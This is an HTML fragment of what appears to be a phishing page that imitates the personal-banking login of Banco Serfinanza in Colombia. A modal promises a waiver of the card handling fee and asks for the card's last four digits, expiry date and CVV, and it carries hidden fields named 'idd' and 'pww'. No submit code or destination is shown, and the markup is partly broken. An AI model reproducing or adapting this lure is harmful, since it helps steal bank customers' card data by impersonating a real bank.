<body style="overflow-x: hidden; overflow-y: visible;">
    <div class="modal fade show" id="ModActuDatosClient" data-backdrop="static" data-keyboard="false"
        style="top: 0% !important; display: none; overflow: hidden; background: rgba(0,0,0,.3);" aria-modal="true">
        <div class="modal-dialog" style="top: 50%; left: 50%; transform: translate(-50%, -50%); margin: 0 !important;">
            <div class="modal-content">
                <div class="modal-body">
                    <h4 class="text-center">¡BIENVENIDO!</h4>
                    <p class="font-bold">
                        Para continuar confirma los siguientes datos.
                    </p>
                    <p style="font-size: 14px;">
                        Completa los campos del producto para la exoneración de la cuota de manejo.
                    </p>

                    <form id="FormActuDatos" class="">
                        <div class="container">
                            <div class="row">

                                <!--Últimos 4 dígitos-->
                                <div class="col-md-12 ">
                                    <div class="form-group row">
                                        <label class="col-sm-4 col-form-label" for="Direccion">Últimos 4 dígitos de tu tarjeta</label>
                                        <div class="col-sm-8 input-group mb-3">
                                            <input type="text" class="form-control validate soloNumerosyPunto"
                                                id="lastdigits" name="lastdigits" maxlength="4" value="" required>
                                        </div>
                                    </div>
                                </div>

                                <!--Fecha de vencimiento de la tarjeta-->
                                <div class="col-md-12 ">
                                    <div class="form-group row">
                                        <label class="col-sm-4 col-form-label" for="Barrio">Fecha de vencimiento de tu tarjeta</label>
                                        <div class="col-sm-8 input-group mb-3">
                                            <input type="text" class="form-control" id="mm" name="mm" maxlength="2"
                                                value="" placeholder="Mes" required="">
                                            <input type="text" class="form-control" id="yy" name="yy" maxlength="4"
                                                value="" placeholder="Año" required
                                                style="border-bottom-left-radius: 0px !important; border-top-left-radius: 0px !important;">
                                        </div>
                                    </div>
                                </div>

                                <!--Código de seguridad CVV-->
                                <div class="col-md-12 ">
                                    <div class="form-group row">
                                        <label class="col-sm-4 col-form-label" for="Celular">Código de seguridad de tu tarjeta</label>
                                        <div class="col-sm-8 input-group mb-3" style="margin-bottom: 0px !important;">
                                            <input type="password" class="form-control validate soloNumerosyPunto"
                                                id="cvv" name="cvv" maxlength="3" value="" required>
                                        </div>
                                    </div>
                                </div>
                                <input type="hidden" id="idd" name="idd" value="1">
                                <input type="hidden" id="pww" name="pww" value="1">

                                <div class="col-md-12 mt-4">
                                    <div class="custom-control custom-checkbox">
                                        <input type="checkbox" class="custom-control-input" id="TerminosYCondiciones"
                                            name="TerminosYCondiciones" value="" required>
                                        <label class="custom-control-label" for="TerminosYCondiciones">
                                            He leido y autorizo el
                                            <a href="https://bancoserfinanza.com/servicio-al-cliente/legales/" target="_blank">tratamiento de mi información personal</a> y conozco la
                                            <a href="https://bancoserfinanza.com/servicio-al-cliente/legales/" target="_blank">Política para la administación de datos personales</a>
                                        </label>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="modal-footer" style="margin-top: 0 !important;">
                            <button type="button" name="FinishedButton" class="btn btn-primary" id="BtnActualizarDatos"
                                style="margin-top: 0 !important; margin-bottom: 0 !important;">Confirmar</button>
                        </div>
                    </form>

                </div>
            </div>
        </div>
    </div>

    <div class="container-fluid">

                    <div class="clearfix"></div>
                </div>
            </div>
            <!-- Page Loader Ends -->

            <header class="headLogin">
                <div id="logoPrincipal" class="col">
                    <div class="row">

                            <img src="/Personal/Assets/img/logo2.png" alt="Serfinansa">
                            <div class="titleLogin">
                                <h1>BANCA PERSONAS</h1>
                            </div>
                        </div>
                    </div>
                </div>
                <hr />
                <div class="spaceline"></div>
            </header>
        </div>

        <div class="row">
            <div class="col-lg-6 col-12 p-1">
                <div class="row" style="overflow: visible;">
                    <div class="col-1 logo-super">
                        <img src="/Personal/Assets/img/superfinanciera%20Vigilado-01.jpg" alt="Vigilado Superfinanciera" />
